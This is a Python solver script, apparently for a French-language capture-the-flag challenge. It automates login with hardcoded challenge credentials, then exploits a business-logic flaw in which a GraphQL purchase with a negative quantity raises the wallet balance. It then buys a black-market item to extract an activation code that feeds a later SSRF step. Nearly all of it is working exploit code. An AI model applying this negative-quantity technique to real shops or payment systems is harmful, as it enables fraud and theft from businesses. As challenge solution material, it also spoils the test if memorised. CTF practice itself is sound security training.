#!/usr/bin/env python3
"""
step2.py — Escape from "Prison de la Santé"
Business Logic Exploit + achat au marché noir pour obtenir le code d'activation FLUX.

Chaîne :
  1. Connexion en tant que m.scofield (FoxRiver1!)
  2. Récupération d'un article disponible en boutique
  3. Achat avec quantité négative → solde gonflé (+2 400€ minimum)
  4. Recherche de l'annonce "Tuyau" sur le marché noir
  5. Achat du tuyau (retry si détecté, 10% de risque)
  6. Extraction du code FLUX-<hex> depuis le message de confirmation

Usage :
  python3 step2.py --target http://challenge.ctf:PORT
"""

import argparse
import re
import sys

import requests

INMATE_USER = "m.scofield"
INMATE_PASS = "FoxRiver1!"
TUYAU_PRICE  = 1800.0


def gql(session, target, query, variables=None, token=None):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    body = {"query": query}
    if variables:
        body["variables"] = variables
    resp = session.post(f"{target}/graphql", json=body, headers=headers, timeout=15)
    resp.raise_for_status()
    data = resp.json()
    if "errors" in data:
        raise RuntimeError(f"GraphQL error: {data['errors']}")
    return data["data"]


def login(session, target, username, password):
    resp = session.post(
        f"{target}/api/auth/login",
        json={"username": username, "password": password},
        timeout=10,
    )
    resp.raise_for_status()
    j = resp.json()
    if "token" not in j:
        raise RuntimeError(f"Login échoué pour {username} : {j}")
    return j["token"]


def get_wallet_balance(session, target, jwt):
    data = gql(session, target, "{ myProfile { walletBalance } }", token=jwt)
    return float(data["myProfile"]["walletBalance"])


def inflate_wallet(session, target, jwt, target_amount=TUYAU_PRICE + 50):
    print(f"[2/3] Business Logic — gonflement du solde (objectif : {target_amount:.0f}€)")
    balance = get_wallet_balance(session, target, jwt)
    print(f"      Solde initial : {balance:.2f}€")

    if balance >= target_amount:
        print(f"      Solde suffisant, aucune action nécessaire")
        return

    # Récupère un article disponible à prix élevé pour maximiser le gain
    data = gql(session, target, "{ storeItems { id name price stock available } }", token=jwt)
    items = [i for i in data["storeItems"] if i["available"] and int(i["stock"]) > 0]
    if not items:
        raise RuntimeError("Aucun article disponible en boutique")
    item = max(items, key=lambda i: float(i["price"]))
    print(f"      Article choisi : {item['name']} @ {item['price']}€ (id={item['id']})")

    # Quantité négative nécessaire pour couvrir le déficit
    price = float(item["price"])
    needed = target_amount - balance
    qty = -int(needed / price) - 10  # marge de sécurité

    data = gql(
        session, target,
        """
          mutation BuyNeg($items: [PurchaseItemInput!]!) {
            purchaseItems(items: $items) { total }
          }
        """,
        variables={"items": [{"itemId": item["id"], "quantity": qty}]},
        token=jwt,
    )
    gain = abs(float(data["purchaseItems"]["total"]))
    new_balance = get_wallet_balance(session, target, jwt)
    print(f"      Gain : +{gain:.2f}€ — Nouveau solde : {new_balance:.2f}€")


def buy_tuyau(session, target, jwt):
    print("[3/3] Marché noir — achat du tuyau")

    data = gql(
        session, target,
        """
          {
            blackMarketListings {
              id price quantity active
              contrabandItem { name description }
              seller { username }
            }
          }
        """,
        token=jwt,
    )

    listing = None
    for l in data["blackMarketListings"]:
        name = l["contrabandItem"]["name"].lower()
        if "tuyau" in name or "service" in name:
            listing = l
            break

    if not listing:
        raise RuntimeError("Annonce du tuyau introuvable sur le marché noir")

    print(f"      Annonce : {listing['contrabandItem']['name']} @ {listing['price']}€ "
          f"(id={listing['id']}, vendeur={listing['seller']['username']})")

    data = gql(
        session, target,
        """
          mutation Buy($id: ID!) {
            buyFromBlackMarket(listingId: $id) { detected message }
          }
        """,
        variables={"id": listing["id"]},
        token=jwt,
    )
    result = data["buyFromBlackMarket"]
    if result["detected"]:
        raise RuntimeError(
            "Transaction détectée (~10% de risque). L'annonce passe à quantity=0 / active=FALSE "
            "et ne peut plus être achetée. Relancer le challenge pour réinitialiser le seed."
        )
    msg = result["message"]
    print(f"      Transaction réussie : {msg}")
    match = re.search(r"(FLUX-[0-9a-f]+)", msg, re.IGNORECASE)
    if not match:
        raise RuntimeError(f"Code introuvable dans le message : {msg}")
    code = match.group(1)
    print(f"\n[+] Code d'activation : {code}")
    return code


def main():
    parser = argparse.ArgumentParser(description="Step 2 — BLE + marché noir → code d'activation")
    parser.add_argument("--target", required=True, help="URL du challenge, ex. http://10.0.0.1:3000")
    args = parser.parse_args()
    target = args.target.rstrip("/")

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (CTF Solver)"})

    print(f"[*] Cible : {target}\n")

    print(f"[1/3] Connexion en tant que {INMATE_USER}")
    jwt = login(session, target, INMATE_USER, INMATE_PASS)
    print(f"      JWT : {jwt[:48]}…")

    inflate_wallet(session, target, jwt)
    code = buy_tuyau(session, target, jwt)

    print(f"\n[+] Utiliser ce code pour l'étape SSRF : {code}")


if __name__ == "__main__":
    main()
